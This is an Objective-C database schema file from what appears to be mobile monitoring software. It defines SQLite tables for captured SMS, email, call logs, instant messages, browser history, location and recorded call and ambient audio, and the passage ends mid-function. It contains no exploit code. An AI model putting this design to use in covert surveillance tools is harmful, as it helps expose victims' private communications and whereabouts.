//
//  DatabaseSchema.m
//  FxSqLite
//
//  Created by Makara Khloth on 9/8/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "DatabaseSchema.h"
#import "DatabaseManager.h"
#import "FxDbException.h"
#import "FxSqlString.h"

#import <sqlite3.h>

// Sql to create tables
static const NSString* kCreateSystemTable		= @"CREATE TABLE system (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"log_type INTEGER NOT NULL,"
															"direction INTEGER NOT NULL,"
															"message TEXT NOT NULL);";

static const NSString* kCreatePanicTable		= @"CREATE TABLE panic (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"panic_status INTEGER NOT NULL);";

static const NSString* kCreateLocationTable		= @"CREATE TABLE location (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"longitude REAL,"
															"latitude REAL,"
															"altitude REAL,"
															"horizontal_acc REAL,"
															"vertical_acc REAL,"
															"speed REAL,"
															"heading REAL,"
															"datum_id INTEGER,"
															"network_id TEXT,"
															"network_name TEXT,"
															"cell_id INTEGER,"
															"cell_name TEXT,"
															"area_code TEXT,"
															"country_code TEXT,"
															"calling_module INTEGER,"
															"method INTEGER,"
															"provider INTEGER);";

static const NSString* kCreateCallLogTable		= @"CREATE TABLE call_log (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"direction INTEGER NOT NULL,"
															"duration INTEGER NOT NULL,"
															"number TEXT NOT NULL,"
															"contact_name TEXT);";

static const NSString* kCreateSMSTable			= @"CREATE TABLE sms (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"direction INTEGER NOT NULL,"
															"sender_number TEXT,"
															"contact_name TEXT,"
															"subject TEXT,"
															"message TEXT,"
															"conversation_id TEXT);";

static const NSString* kCreateMMSTable			= @"CREATE TABLE mms (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"direction INTEGER NOT NULL,"
															"sender_number TEXT,"
															"contact_name TEXT,"
															"subject TEXT,"
															"message TEXT,"
															"conversation_id TEXT);";

static const NSString* kCreateEmailTable		= @"CREATE TABLE email (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"direction INTEGER NOT NULL,"
															"sender_email TEXT,"
															"contact_name TEXT,"
															"subject TEXT,"
															"message TEXT,"
															"html_text TEXT);";

static const NSString* kCreateMediaTable		= @"CREATE TABLE media (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"full_path TEXT NOT NULL,"
															"media_event_type INTEGER NOT NULL,"
															"thumbnail_delivered INTEGER NOT NULL,"
															"has_thumbnail INTEGER NOT NULL,"
															"duration INTEGER);";

static const NSString* kCreateAttachmentTable	= @"CREATE TABLE attachment (id INTEGER PRIMARY KEY,"
															"full_path TEXT NOT NULL,"
															"mms_id INTEGER,"
															"email_id INTEGER,"
															"im_id INTEGER,"
															"FOREIGN KEY(mms_id) REFERENCES mms(id),"
															"FOREIGN KEY(email_id) REFERENCES email(id),"
															"FOREIGN KEY(im_id) REFERENCES im(id));";

static const NSString* kCreateRecipientTable	= @"CREATE TABLE recipient (id INTEGER PRIMARY KEY,"
															"recipient_type INTEGER NOT NULL,"
															"recipient TEXT NOT NULL,"
															"contact_name TEXT,"
															"sms_id INTEGER,"
															"mms_id INTEGER,"
															"email_id INTEGER,"
															"im_id INTEGER,"
															"FOREIGN KEY(sms_id) REFERENCES sms(id),"
															"FOREIGN KEY(mms_id) REFERENCES mms(id),"
															"FOREIGN KEY(email_id) REFERENCES email(id),"
															"FOREIGN KEY(im_id) REFERENCES im(id));";

static const NSString* kCreateGPSTagTable		= @"CREATE TABLE gps_tag (id INTEGER PRIMARY KEY,"
															"longitude REAL,"
															"latitude REAL,"
															"altitude REAL,"
															"cell_id INTEGER,"
															"area_code TEXT,"
															"network_id TEXT,"
															"country_code TEXT,"
															"FOREIGN KEY(id) REFERENCES media(id));";

static const NSString* kCreateCallTagTable		= @"CREATE TABLE call_tag (id INTEGER PRIMARY KEY,"
															"direction INTEGER,"
															"duration INTEGER,"
															"number TEXT NOT NULL,"
															"contact_name TEXT,"
															"FOREIGN KEY(id) REFERENCES media(id));";

static const NSString* kCreateThumbnailTable	= @"CREATE TABLE thumbnail (id INTEGER PRIMARY KEY,"
															"full_path TEXT,"
															"actual_size INTEGER NOT NULL,"
															"actual_duration INTEGER,"
															"media_id INTEGER,"
															"FOREIGN KEY(media_id) REFERENCES media(id));";

static const NSString* kCreateEventBaseTable	= @"CREATE TABLE event_base (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"event_type INTEGER NOT NULL,"
															"event_id INTEGER NOT NULL,"
															"direction INTEGER);";

static const NSString* kCreateSettingsTable		= @"CREATE TABLE settings (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"settings_data BLOB NOT NULL);";

static const NSString* kCreateIMTable			= @"CREATE TABLE im (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"direction INTEGER NOT NULL,"
															"user_id TEXT,"
															"im_service_id TEXT,"
															"message TEXT,"
															"user_display_name TEXT);";

static const NSString *kCreateBrowserUrlTable	= @"CREATE TABLE browser_url (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL,"
															"title TEXT,"
															"url TEXT NOT NULL,"
															"visit_time TEXT,"
															"block INTEGER,"
															"owning_app TEXT NOT NULL);";

static const NSString *kCreateBookmarksTable	= @"CREATE TABLE bookmarks (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"time TEXT NOT NULL);";

static const NSString *kCreateBookmarkTable		= @"CREATE TABLE bookmark (id INTEGER PRIMARY KEY AUTOINCREMENT,"
															"title TEXT,"
															"url TEXT NOT NULL,"
															"bookmarks_id INTEGER,"
															"FOREIGN KEY(bookmarks_id) REFERENCES bookmarks(id));";

static NSString * const kCreateApplicationLifeCycleTable	= @"CREATE TABLE application_life_cycle (id INTEGER PRIMARY KEY AUTOINCREMENT,"
																"time TEXT NOT NULL,"
																"app_state INTEGER,"
																"app_type INTEGER,"
																"app_id TEXT,"
																"app_name TEXT,"
																"app_version TEXT,"
																"app_size INTEGER,"
																"app_icon_type INTEGER,"
																"app_icon_data BLOB);";

static NSString * const kCreateIMMessageTable				= @"CREATE TABLE im_message (id INTEGER PRIMARY KEY AUTOINCREMENT,"
																"time TEXT NOT NULL,"
																"direction INTEGER,"
																"service_id INTEGER,"
																"conversation_id TEXT,"
																"sender_id TEXT,"
																"sender_place_name TEXT,"
																"sender_place_longitude REAL,"
																"sender_place_latitude REAL,"
																"sender_place_altitude REAL,"
																"sender_place_hor_accuracy REAL,"
																"message_representation INTEGER,"
																"message TEXT,"
																"share_place_name TEXT,"
																"share_place_longitude REAL,"
																"share_place_latitude REAL,"
																"share_place_altitude REAL,"
																"share_place_hor_accuracy REAL);";

static NSString * const kCreateIMAccountTable				= @"CREATE TABLE im_account (id INTEGER PRIMARY KEY AUTOINCREMENT,"
																"time TEXT NOT NULL,"
																"service_id INTEGER,"
																"account_id TEXT,"
																"display_name TEXT,"
																"status_message TEXT,"
																"picture BLOB);";

static NSString * const kCreateIMContactTable				= @"CREATE TABLE im_contact (id INTEGER PRIMARY KEY AUTOINCREMENT,"
																"time TEXT NOT NULL,"
																"service_id INTEGER,"
																"account_id TEXT,"
																"contact_id TEXT,"
																"display_name TEXT,"
																"status_message TEXT,"
																"picture BLOB);";

static NSString * const kCreateIMConversationTable			= @"CREATE TABLE im_conversation (id INTEGER PRIMARY KEY AUTOINCREMENT,"
																"time TEXT NOT NULL,"
																"service_id INTEGER,"
																"account_id TEXT,"
																"conversation_id TEXT,"
																"conversation_name TEXT,"
																"status_message TEXT,"
																"picture BLOB);";

static NSString * const kCreateIMConversationContactTable	= @"CREATE TABLE im_conversation_contact (id INTEGER PRIMARY KEY AUTOINCREMENT,"
																"im_conversation_id INTEGER NOT NULL,"
																"im_conversation_contact_id TEXT NOT NULL,"
																"FOREIGN KEY(im_conversation_id) REFERENCES im_conversation(id));";

static NSString * const kCreateIMMessageAttachmentTable		= @"CREATE TABLE im_message_attachment (id INTEGER PRIMARY KEY AUTOINCREMENT,"
																"full_path TEXT,"
																"thumbnail BLOB,"
																"im_message_id INTEGER,"
																"FOREIGN KEY(im_message_id) REFERENCES im_message(id));";

// Sql to create indexes
static const NSString* kCreateSystemIndex		= @"CREATE INDEX system_index ON system (id);";
static const NSString* kCreatePanicIndex		= @"CREATE INDEX panic_index ON panic (id);";
static const NSString* kCreateLocationIndex		= @"CREATE INDEX location_index ON location (id);";
static const NSString* kCreateCallLogIndex		= @"CREATE INDEX call_log_index ON call_log (id);";
static const NSString* kCreateSMSIndex			= @"CREATE INDEX sms_index ON sms (id);";
static const NSString* kCreateMMSIndex			= @"CREATE INDEX mms_index ON mms (id);";
static const NSString* kCreateEmailIndex		= @"CREATE INDEX email_index ON email (id);";
static const NSString* kCreateMediaIndex		= @"CREATE INDEX media_index ON media (id);";
static const NSString* kCreateAttachmentIndex	= @"CREATE INDEX attachment_index ON attachment (id);";
static const NSString* kCreateRecipientIndex	= @"CREATE INDEX recipient_index ON recipient (id);";
static const NSString* kCreateGPSTagIndex		= @"CREATE INDEX gps_tag_index ON gps_tag (id);";
static const NSString* kCreateCallTagIndex		= @"CREATE INDEX call_tag_index ON call_tag (id);";
static const NSString* kCreateThumbnailIndex	= @"CREATE INDEX thumbnail_index ON thumbnail (id);";
static const NSString* kCreateEventBaseIndex	= @"CREATE INDEX event_base_index ON event_base (id);";
static const NSString* kCreateSettingsIndex		= @"CREATE INDEX settings_index ON settings (id);";
static const NSString* kCreateIMIndex			= @"CREATE INDEX im_index ON im (id);";
static const NSString *kCreateBrowserUrlIndex	= @"CREATE INDEX browser_url_index ON browser_url (id);";
static const NSString *kCreateBookmarksIndex	= @"CREATE INDEX bookmarks_index ON bookmarks (id);";
static const NSString *kCreateBookmarkIndex		= @"CREATE INDEX bookmark_index ON bookmark (id);";
static NSString * const kCreateApplicationLifeCycleIndex	= @"CREATE INDEX application_life_cycle_index ON application_life_cycle (id);";
static NSString * const kCreateIMMessageIndex	= @"CREATE INDEX im_message_index ON im_message (id);";
static NSString * const kCreateIMAccountIndex	= @"CREATE INDEX im_account_index ON im_account (id);";
static NSString * const kCreateIMContactIndex	= @"CREATE INDEX im_contact_index ON im_contact (id);";
static NSString * const kCreateIMConversationIndex			= @"CREATE INDEX im_conversation_index ON im_conversation (id);";
static NSString * const kCreateIMConversationContactIndex	= @"CREATE INDEX im_conversation_contact_index ON im_conversation_contact (id);";
static NSString * const kCreateIMMessageAttachmentIndex		= @"CREATE INDEX im_message_attachment_index ON im_message_attachment (id);";

// Sql drop tables
static NSString* const kDropSystemTable         = @"DROP TABLE system;";
static NSString* const kDropCallLogTable        = @"DROP TABLE call_log;";
static NSString* const kDropPanicTable          = @"DROP TABLE panic;";
static NSString* const kDropLocationTable       = @"DROP TABLE location;";
static NSString* const kDropEventBaseTable      = @"DROP TABLE event_base;";
static NSString* const kDropSMSTable            = @"DROP TABLE sms;";
static NSString* const kDropMMSTable            = @"DROP TABLE mms;";
static NSString* const kDropEmailTable          = @"DROP TABLE email;";
static NSString* const kDropAttachmentTable     = @"DROP TABLE attachment;";
static NSString* const kDropRecipientTable      = @"DROP TABLE recipient;";
static NSString* const kDropMediaTable          = @"DROP TABLE media;";
static NSString* const kDropGPSTagTable         = @"DROP TABLE gps_tag;";
static NSString* const kDropCallTagTable        = @"DROP TABLE call_tag;";
static NSString* const kDropThumbnailTable      = @"DROP TABLE thumbnail;";
static NSString* const kDropSettingsTable		= @"DROP TABLE settings;";
static NSString* const kDropIMTable				= @"DROP TABLE im;";
static NSString *const kDropBrowserUrlTable		= @"DROP TABLE browser_url;";
static NSString *const kDropBookmarksTable		= @"DROP TABLE bookmarks;";
static NSString *const kDropBookmarkTable		= @"DROP TABLE bookmark;";
static NSString * const kDropApplicationLifeCycleTable = @"DROP TABLE application_life_cycle;";
static NSString * const kDropIMMessageTable		= @"DROP TABLE im_message;";
static NSString * const kDropIMAccountTable		= @"DROP TABLE im_account;";
static NSString * const kDropIMContactTable		= @"DROP TABLE im_contact;";
static NSString * const kDropIMConversationTable		= @"DROP TABLE im_conversation;";
static NSString * const kDropIMConversationContactTable	= @"DROP TABLE im_conversation_contact;";
static NSString * const kDropIMMessageAttachmentTable	= @"DROP TABLE im_message_attachment;";

// Delete on drop tables
// ********** Auto increment field start from 1 ***********
static NSString* const kDeleteRecipientOnDropSMSTable       = @"DELETE FROM recipient WHERE sms_id > 0;";
static NSString* const kDeleteRecipientOnDropMMSTable       = @"DELETE FROM recipient WHERE mms_id > 0;";
static NSString* const kDeleteAttachmentOnDropMMSTable      = @"DELETE FROM attachment WHERE mms_id > 0;";
static NSString* const kDeleteRecipientOnDropEmailTable     = @"DELETE FROM recipient WHERE email_id > 0;";
static NSString* const kDeleteAttachmentOnDropEmailTable    = @"DELETE FROM attachment WHERE email_id > 0;";
static NSString* const kDeleteRecipientOnDropIMTable		= @"DELETE FROM recipient WHERE im_id > 0;";
static NSString* const kDeleteAttachmentOnDropIMTable		= @"DELETE FROM attachment WHERE im_id > 0;";
static NSString* const kDeleteRowOnDropAnyTable             = @"DELETE FROM event_base WHERE event_type = ?;";
// bookmarks and bookmark table is deleted all a long together


// Sql to create triggers
static const NSString* kCreateDeleteMMSAttachmentTrigger	= @"CREATE TRIGGER delete_mms_attachment AFTER DELETE ON mms "
																	"BEGIN "
																	"DELETE FROM attachment WHERE old.id = attachment.mms_id;"
																	"END;";

static const NSString* kCreateDeleteEmailAttachmentTrigger	= @"CREATE TRIGGER delete_email_attachment AFTER DELETE ON email "
																	"BEGIN "
																	"DELETE FROM attachment WHERE old.id = attachment.email_id;"
																	"END;";

static const NSString* kCreateDeleteSMSRecipientTrigger		= @"CREATE TRIGGER delete_sms_recipient AFTER DELETE ON sms "
																	"BEGIN "
																	"DELETE FROM recipient WHERE old.id = recipient.sms_id;"
																	"END;";

static const NSString* kCreateDeleteMMSRecipientTrigger		= @"CREATE TRIGGER delete_mms_recipient AFTER DELETE ON mms "
																	"BEGIN "
																	"DELETE FROM recipient WHERE old.id = recipient.mms_id;"
																	"END;";

static const NSString* kCreateDeleteEmailRecipientTrigger	= @"CREATE TRIGGER delete_email_recipient AFTER DELETE ON email "
																	"BEGIN "
																	"DELETE FROM recipient WHERE old.id = recipient.email_id;"
																	"END;";

static const NSString* kCreateDeleteGPSTagTrigger			= @"CREATE TRIGGER delete_gps_tag AFTER DELETE ON media "
																	"BEGIN "
																	"DELETE FROM gps_tag WHERE old.id = gps_tag.id;"
																	"END;";

static const NSString* kCreateDeleteCallTagTrigger			= @"CREATE TRIGGER delete_call_tag AFTER DELETE ON media "
																	"BEGIN "
																	"DELETE FROM call_tag WHERE old.id = call_tag.id;"
																	"END;";

static const NSString* kCreateDeleteThumbnailTrigger		= @"CREATE TRIGGER delete_thumbnail AFTER UPDATE OF thumbnail_delivered ON media "
																	"BEGIN "
																	"DELETE FROM thumbnail WHERE new.id = thumbnail.media_id AND new.thumbnail_delivered = 1;"
																	"END;";

static const NSString* kCreateDeleteIMAttachmentTrigger		= @"CREATE TRIGGER delete_im_attachment AFTER DELETE ON im "
																	"BEGIN "
																	"DELETE FROM attachment WHERE old.id = attachment.im_id;"
																	"END;";

static const NSString* kCreateDeleteIMRecipientTrigger		= @"CREATE TRIGGER delete_im_recipient AFTER DELETE ON im "
																	"BEGIN "
																	"DELETE FROM recipient WHERE old.id = recipient.im_id;"
																	"END;";

static const NSString *kCreateDeleteBookmarksBookmarkTrigger		= @"CREATE TRIGGER delete_bookmarks_bookmark AFTER DELETE ON bookmarks "
																		"BEGIN "
																		"DELETE FROM bookmark WHERE old.id = bookmark.bookmarks_id;"
																		"END;";

static NSString * const kCreateDeleteIMMessageAttachmentTrigger		= @"CREATE TRIGGER delete_im_message_attachment AFTER DELETE ON im_message "
																		"BEGIN "
																		"DELETE FROM im_message_attachment WHERE old.id = im_message_attachment.im_message_id;"
																		"END;";

static NSString * const kCreateDeleteIMConversationContactTrigger	= @"CREATE TRIGGER delete_im_conversation_contact AFTER DELETE ON im_conversation "
																		"BEGIN "
																		"DELETE FROM im_conversation_contact WHERE old.id = im_conversation_contact.im_conversation_id;"
																		"END;";

@interface DatabaseSchema (private)

- (void) createTables: (const NSString*) sqlString;
- (void) createIndexes: (const NSString*) sqlString;
- (void) createTriggers: (const NSString*) sqlString;
- (void) executeSql: (const NSString*) sqlString;

@end

@implementation DatabaseSchema (private)

- (void) createTables: (const NSString*) sqlString
{
	[self executeSql:sqlString];
}

- (void) createIndexes: (const NSString*) sqlString
{
	[self executeSql:sqlString];
}

- (void) createTriggers: (const NSString*) sqlString
{
	[self executeSql:sqlString];
}

- (void) executeSql: (const NSString*) sqlString
{
	char* errorMessage = NULL;
	NSInteger sqliteError = sqlite3_exec([databaseManager sqlite3db], [sqlString cStringUsingEncoding:NSASCIIStringEncoding], NULL, NULL, &errorMessage);
	
	if (errorMessage)
	{
		sqlite3_free(errorMessage);
	}
	
	if (sqliteError != SQLITE_OK)
	{
		FxDbException* dbException = [FxDbException exceptionWithName:@"Execute sql to create table or index or trigger" andReason:@"Sqlite3 sql error"];
		dbException.errorCode = sqliteError;
		@throw dbException;
	}
}

@end

@implementation DatabaseSchema

- (id) initWithDatabaseManager: (DatabaseManager*) dbManager
{
	if ((self = [super init]))
	{
		databaseManager = dbManager;
	}
	return (self);
}

- (void) dealloc
{
	[super dealloc];
}

- (void) createDatabaseSchema
{
	// Create tables =========================================================
	// System
	[self createTables:kCreateSystemTable];
	// Panic
	[self createTables:kCreatePanicTable];
	// Location
	[self createTables:kCreateLocationTable];
	// Call log
	[self createTables:kCreateCallLogTable];
	// SMS
	[self createTables:kCreateSMSTable];
	// MMS
	[self createTables:kCreateMMSTable];
	// Email
	[self createTables:kCreateEmailTable];
	// Media
	[self createTables:kCreateMediaTable];
	// Attachment
	[self createTables:kCreateAttachmentTable];
	// Recipient
	[self createTables:kCreateRecipientTable];
	// GPS tag
	[self createTables:kCreateGPSTagTable];
	// Call tag
	[self createTables:kCreateCallTagTable];
	// Thumbnail
	[self createTables:kCreateThumbnailTable];
	// Event base
	[self createTables:kCreateEventBaseTable];
	// Settings
	[self createTables:kCreateSettingsTable];
	// IM
	[self createTables:kCreateIMTable];
	// Browser url
	[self createTables:kCreateBrowserUrlTable];
	// Bookmarks
	[self createTables:kCreateBookmarksTable];
	// Bookmark
	[self createTables:kCreateBookmarkTable];
	// Application life cycle
	[self createTables:kCreateApplicationLifeCycleTable];
	// IM message
	[self createTables:kCreateIMMessageTable];
	// IM account
	[self createTables:kCreateIMAccountTable];
	// IM contact
	[self createTables:kCreateIMContactTable];
	// IM conversation
	[self createTables:kCreateIMConversationTable];
	// IM message attachment
	[self createTables:kCreateIMMessageAttachmentTable];
    // IM conversation contact
    [self createTables:kCreateIMConversationContactTable];
	
	// Create indexes =========================================================
	// System
	[self createIndexes:kCreateSystemIndex];
	// Panic
	[self createIndexes:kCreatePanicIndex];
	// Location
	[self createIndexes:kCreateLocationIndex];
	// Call log
	[self createIndexes:kCreateCallLogIndex];
	// SMS
	[self createIndexes:kCreateSMSIndex];
	// MMS
	[self createIndexes:kCreateMMSIndex];
	// Email
	[self createIndexes:kCreateEmailIndex];
	// Media
	[self createIndexes:kCreateMediaIndex];
	// Attachment
	[self createIndexes:kCreateAttachmentIndex];
	// Recipient
	[self createIndexes:kCreateRecipientIndex];
	// GPS tag
	[self createIndexes:kCreateGPSTagIndex];
	// Call tag
	[self createIndexes:kCreateCallTagIndex];
	// Thumbnail
	[self createIndexes:kCreateThumbnailIndex];
	// Event base
	[self createIndexes:kCreateEventBaseIndex];
	// Settings
	[self createIndexes:kCreateSettingsIndex];
	// IM
	[self createIndexes:kCreateIMIndex];
	// Browser url
	[self createIndexes:kCreateBrowserUrlIndex];
	// Bookmarks
	[self createIndexes:kCreateBookmarksIndex];
	// Bookmark
	[self createIndexes:kCreateBookmarkIndex];
	// Application life cycle
	[self createIndexes:kCreateApplicationLifeCycleIndex];
	// IM message
	[self createIndexes:kCreateIMMessageIndex];
	// IM account
	[self createIndexes:kCreateIMAccountIndex];
	// IM contact
	[self createIndexes:kCreateIMContactIndex];
	// IM conversation
	[self createIndexes:kCreateIMConversationIndex];
	// IM message attachment
	[self createIndexes:kCreateIMMessageAttachmentIndex];
    // IM conversation contact
	[self createIndexes:kCreateIMConversationContactIndex];
	
	// Create triggers =========================================================
	// Delete mms attachment
	[self createTriggers:kCreateDeleteMMSAttachmentTrigger];
	// Delete email attachment
	[self createTriggers:kCreateDeleteEmailAttachmentTrigger];
	// Delete sms recipient
	[self createTriggers:kCreateDeleteSMSRecipientTrigger];
	// Delete mms recipient
	[self createTriggers:kCreateDeleteMMSRecipientTrigger];
	// Delete email recipient
	[self createTriggers:kCreateDeleteEmailRecipientTrigger];
	// Delete GPS tag
	[self createTriggers:kCreateDeleteGPSTagTrigger];
	// Delete call tag
	[self createTriggers:kCreateDeleteCallTagTrigger];
	// Delete thumbnail
	[self createTriggers:kCreateDeleteThumbnailTrigger];
	// Delete im attachment
	[self createTriggers:kCreateDeleteIMAttachmentTrigger];
	// Delete im recipient
	[self createTriggers:kCreateDeleteIMRecipientTrigger];
	// Delete bookmarks bookmark
	[self createTriggers:kCreateDeleteBookmarksBookmarkTrigger];
	// Delete im message attachment
	[self createTriggers:kCreateDeleteIMMessageAttachmentTrigger];
	// Delete im conversation contact
	[self createTriggers:kCreateDeleteIMConversationContactTrigger];
}

- (void) dropTable:(FxEventType) aTableId {
    // When table is dropped, index, trigger associated with the table would drop as well; TESTED!
	DLog (@"Drop the table id = %d", aTableId);
    BOOL maintainAllMedia = FALSE;
    switch (aTableId) {
        case kEventTypeCallLog: {
            [self executeSql:kDropCallLogTable];
            
            [self executeSql:kCreateCallLogTable];
            [self executeSql:kCreateCallLogIndex];
        } break;
        case kEventTypeSystem: {
            [self executeSql:kDropSystemTable];
            
            [self executeSql:kCreateSystemTable];
            [self executeSql:kCreateSystemIndex];
        } break;
		case kEventTypeSettings: {
			[self executeSql:kDropSettingsTable];
			
			[self executeSql:kCreateSettingsTable];
			[self executeSql:kCreateSettingsIndex];
		} break;
        case kEventTypePanic: {
            [self executeSql:kDropPanicTable];
            
            [self executeSql:kCreatePanicTable];
            [self executeSql:kCreatePanicIndex];
        } break;
        case kEventTypeLocation: {
            [self executeSql:kDropLocationTable];
            
            [self executeSql:kCreateLocationTable];
            [self executeSql:kCreateLocationIndex];
        } break;
        case kEventTypeSms: {
            [self executeSql:kDropSMSTable];
            [self executeSql:kDeleteRecipientOnDropSMSTable];
            
            [self executeSql:kCreateSMSTable];
            [self executeSql:kCreateSMSIndex];
            
            [self executeSql:kCreateDeleteSMSRecipientTrigger];
        } break;
        case kEventTypeMms: {
            [self executeSql:kDropMMSTable];
            [self executeSql:kDeleteRecipientOnDropMMSTable];
            [self executeSql:kDeleteAttachmentOnDropMMSTable];
            
            [self executeSql:kCreateMMSTable];
            [self executeSql:kCreateMMSIndex];
            
            [self executeSql:kCreateDeleteMMSAttachmentTrigger];
            [self executeSql:kCreateDeleteMMSRecipientTrigger];
        } break;
        case kEventTypeMail: {
            [self executeSql:kDropEmailTable];
            [self executeSql:kDeleteRecipientOnDropEmailTable];
            [self executeSql:kDeleteAttachmentOnDropEmailTable];
            
            [self executeSql:kCreateEmailTable];
            [self executeSql:kCreateEmailIndex];
            
            [self executeSql:kCreateDeleteEmailAttachmentTrigger];
            [self executeSql:kCreateDeleteEmailRecipientTrigger];
        } break;
		case kEventTypeIM: {
			[self executeSql:kDropIMTable];
            [self executeSql:kDeleteRecipientOnDropIMTable];
            [self executeSql:kDeleteAttachmentOnDropIMTable];
            
            [self executeSql:kCreateIMTable];
            [self executeSql:kCreateIMIndex];
            
            [self executeSql:kCreateDeleteIMAttachmentTrigger];
            [self executeSql:kCreateDeleteIMRecipientTrigger];
		} break;
		case kEventTypeBrowserURL: {
			[self executeSql:kDropBrowserUrlTable];
			
			[self executeSql:kCreateBrowserUrlTable];
			[self executeSql:kCreateBrowserUrlIndex];
		} break;
		case kEventTypeBookmark: {
			[self executeSql:kDropBookmarksTable];
			[self executeSql:kDropBookmarkTable];
			
			[self executeSql:kCreateBookmarksTable];
			[self executeSql:kCreateBookmarksIndex];
            [self executeSql:kCreateBookmarkTable];
            [self executeSql:kCreateBookmarkIndex];
            
            [self executeSql:kCreateDeleteBookmarksBookmarkTrigger];
		} break;
		case kEventTypeApplicationLifeCycle: {
            [self executeSql:kDropApplicationLifeCycleTable];
            
            [self executeSql:kCreateApplicationLifeCycleTable];
            [self executeSql:kCreateApplicationLifeCycleIndex];
        } break;
		case kEventTypeIMMessage: {
			[self executeSql:kDropIMMessageTable];
			[self executeSql:kDropIMMessageAttachmentTable];
			
			[self executeSql:kCreateIMMessageTable];
			[self executeSql:kCreateIMMessageIndex];
			[self executeSql:kCreateIMMessageAttachmentTable];
			[self executeSql:kCreateIMMessageAttachmentIndex];
			[self executeSql:kCreateDeleteIMMessageAttachmentTrigger];
		} break;
		case kEventTypeIMAccount: {
			[self executeSql:kDropIMAccountTable];
			
			[self executeSql:kCreateIMAccountTable];
			[self executeSql:kCreateIMAccountIndex];
		} break;
		case kEventTypeIMContact: {
			[self executeSql:kDropIMContactTable];
			
			[self executeSql:kCreateIMContactTable];
			[self executeSql:kCreateIMContactIndex];
		} break;
		case kEventTypeIMConversation: {
			[self executeSql:kDropIMConversationTable];
			[self executeSql:kDropIMConversationContactTable];
			
			[self executeSql:kCreateIMConversationTable];
			[self executeSql:kCreateIMConversationIndex];
			[self executeSql:kCreateIMConversationContactTable];
			[self executeSql:kCreateIMConversationContactIndex];
			[self createTriggers:kCreateDeleteIMConversationContactTrigger];
		} break;
		case kEventTypePanicImage:
		case kEventTypeAmbientRecordAudio:
		case kEventTypeAmbientRecordAudioThumbnail:
        case kEventTypeWallpaper:
        case kEventTypeWallpaperThumbnail:
        case kEventTypeCameraImage:
        case kEventTypeCameraImageThumbnail:
        case kEventTypeCallRecordAudio:
        case kEventTypeCallRecordAudioThumbnail:
        case kEventTypeVideo:
        case kEventTypeVideoThumbnail:
        case kEventTypeAudio:
        case kEventTypeAudioThumbnail: {
            [self executeSql:kDropMediaTable];
            [self executeSql:kDropThumbnailTable];
            [self executeSql:kDropGPSTagTable];
            [self executeSql:kDropCallTagTable];
            
            [self executeSql:kCreateMediaTable];
            [self executeSql:kCreateThumbnailTable];
            [self executeSql:kCreateGPSTagTable];
            [self executeSql:kCreateCallTagTable];
            
            [self executeSql:kCreateMediaIndex];
            [self executeSql:kCreateThumbnailIndex];
            [self executeSql:kCreateGPSTagIndex];
            [self executeSql:kCreateCallTagIndex];
            
            [self executeSql:kCreateDeleteGPSTagTrigger];
            [self executeSql:kCreateDeleteCallTagTrigger];
            [self executeSql:kCreateDeleteThumbnailTrigger];
            
            maintainAllMedia = TRUE;
        } break;
        default: {
            [databaseManager dropDB];
        } break;
    }
    
    // Maintain event_base table
    FxSqlString* sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
    [sqlString formatInt:aTableId atIndex:0];
    NSString* sqlStatement = [sqlString finalizeSqlString];
    [self executeSql:sqlStatement];
    [sqlString release];
    
	DLog (@"Is maintain all media = %d", maintainAllMedia);
    if (maintainAllMedia) { // Only thumbnail & media table only 
        // Maintain event_base table
        sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeWallpaper atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
        
        sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeWallpaperThumbnail atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
        
        FxSqlString* sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeCameraImage atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
        
        sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeCameraImageThumbnail atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
        
        sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeCallRecordAudio atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
        
        sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeCallRecordAudioThumbnail atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
        
        sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeVideo atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
        
        sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeVideoThumbnail atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
		
